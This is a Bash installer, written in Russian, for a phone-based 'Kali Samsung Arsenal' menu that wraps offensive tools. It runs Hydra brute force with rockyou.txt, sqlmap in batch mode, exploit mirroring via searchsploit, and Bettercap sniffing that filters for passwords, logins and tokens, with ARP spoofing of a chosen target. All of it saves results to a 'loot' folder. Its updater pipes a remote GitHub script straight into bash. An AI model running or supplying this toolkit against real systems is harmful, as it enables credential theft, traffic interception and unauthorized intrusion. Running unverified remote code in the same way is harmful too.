#!/bin/bash

# VERSION 2.9
CURRENT_VERSION="2.9"

TARGET_FILE="/usr/local/bin/kali_pro"
UPDATE_SCRIPT="/usr/local/bin/update_kali"
REPO_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/kalipro_setup.sh"

echo -e "\033[0;36m[*] Подготовка Kali Pro Arsenal v$CURRENT_VERSION...\033[0m"

create_files() {
    echo -e "\033[0;33m[*] Синхронизация модулей...\033[0m"

    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=2.9
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Глобальная папка для трофеев
LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

run_smart_check() {
    python3 -c "
import shutil, os
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (500*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
get_status('/sdcard', 'ПАМЯТЬ ТЕЛЕФОНА')
"
}

show_menu() {
    clear
    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}      KALI SAMSUNG ARSENAL - MENU v2.9     ${NC}"
    echo -e "${CYAN}===========================================${NC}"
    run_smart_check
    echo -e "${CYAN}-------------------------------------------${NC}"
    echo -e "${BLUE}1.${NC} БЫСТРАЯ ОЧИСТКА / LOOT INFO"
    echo -e "${BLUE}2.${NC} СЕТЕВОЙ СКАНЕР (Smart Nmap)"
    echo -e "${BLUE}3.${NC} ПОИСК ЭКСПЛОЙТОВ (Searchsploit)"
    echo -e "${BLUE}4.${NC} ВЗЛОМ ПАРОЛЕЙ (Hydra)"
    echo -e "${BLUE}5.${NC} ВЕБ-АНАЛИЗ (SQLmap Loot)"
    echo -e "${BLUE}6.${NC} ПЕРЕХВАТ (Bettercap Smart)"
    echo -e "${RED}0.${NC} ВЫХОД"
    echo -e "${CYAN}===========================================${NC}"
}

# --- ФУНКЦИИ МОДУЛЕЙ ---

clean_system() {
    echo -e "${GREEN}[*] Очистка кэша пакетов...${NC}"
    apt-get clean && apt-get autoclean -y
    echo -ne "${BLUE}[!] Объем твоих трофеев: ${NC}"
    du -sh "$LOOT_DIR" | cut -f1
    echo -e "${CYAN}-------------------------------------------${NC}"
    read -p "Удалить все сохраненные трофеи? (y/n): " c_loot
    if [[ "$c_loot" == "y" ]]; then
        rm -rf "$LOOT_DIR"/* && echo -e "${RED}[-] Трофеи удалены.${NC}"
    fi
    sleep 2
}

smart_nmap() {
    read -p "Введите цель: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Сканирование... (Только открытые порты в лог)${NC}"
    # Сохраняем только чистый результат (порты и сервисы)
    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
    echo -e "${GREEN}[+] Результат сохранен в arsenal_loot/nmap_$t.txt${NC}"
    read -p "Enter..."
}

smart_web_scan() {
    read -p "URL цели: " u
    [[ -z "$u" ]] && return
    echo -e "${BLUE}[*] Поиск уязвимостей...${NC}"
    # --output-dir задает место хранения, --batch делает всё сам
    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
    echo -e "${YELLOW}--- ВАЖНЫЕ НАХОДКИ ---${NC}"
    grep -aE "Payload:|target URL" "$LOOT_DIR/sqlmap/log" 2>/dev/null || echo "Ничего критического не найдено."
    read -p "Enter для возврата..."
}

smart_bettercap() {
    LOOT_FILE="$LOOT_DIR/bettercap_loot.txt"
    echo -e "1. Сниффер (Пароли)\n2. ARP-Spoof + AutoLoot\n3. Читать трофеи\n0. Назад"
    read -p "Выбор: " b_opt
    case $b_opt in
        1) bettercap -eval "net.probe on; set net.sniff.verbose false; set net.sniff.regexp .*password|.*login|.*user|.*token; net.sniff on" ;;
        2) 
            read -p "IP цели: " bt
            echo 1 > /proc/sys/net/ipv4/ip_forward
            bettercap -eval "set net.sniff.output $LOOT_FILE; set arp.spoof.targets $bt; arp.spoof on; net.sniff on"
            echo 0 > /proc/sys/net/ipv4/ip_forward
            ;;
        3) 
            [[ -f "$LOOT_FILE" ]] && grep -aE "password|login|user|token" "$LOOT_FILE" || echo "Файл пуст."
            read -p "Enter..."
            ;;
    esac
}

smart_searchsploit() {
    read -p "Поиск: " q; searchsploit "$q"
    read -p "ID для зеркала: " id
    if [[ -n "$id" ]]; then
        cd "$LOOT_DIR" && searchsploit -m "$id"
        echo -e "${GREEN}[+] Эксплойт скопирован в папку трофеев.${NC}"
        read -p "Enter..."
    fi
}

smart_brute() {
    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
    hydra -l $u -P /usr/share/wordlists/rockyou.txt $t $p -V | tee -a "$LOOT_DIR/brute_results.txt"
}

START_TIME=$(date +"%H:%M:%S")
while true; do
    show_menu
    read -p "[Start: $START_TIME] Опция: " opt
    case $opt in
        1) clean_system ;;
        2) smart_nmap ;;
        3) smart_searchsploit ;;
        4) smart_brute ;;
        5) smart_web_scan ;;
        6) smart_bettercap ;;
        0) exit 0 ;;
        *) sleep 1 ;;
    esac
done
EOF

    # Обновление
    cat << EOF > "$UPDATE_SCRIPT"
#!/bin/bash
echo -e "\033[0;34m[*] Принудительное обновление до v$CURRENT_VERSION...\033[0m"
curl -L "$REPO_URL" | bash
EOF

    chmod +x "$TARGET_FILE" "$UPDATE_SCRIPT"
    echo -e "\033[0;32m[+] Арсенал v$CURRENT_VERSION успешно развернут!\033[0m"
}

# Проверка версии
if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] Версия $INSTALLED_VERSION актуальна.\033[0m"
    fi
fi
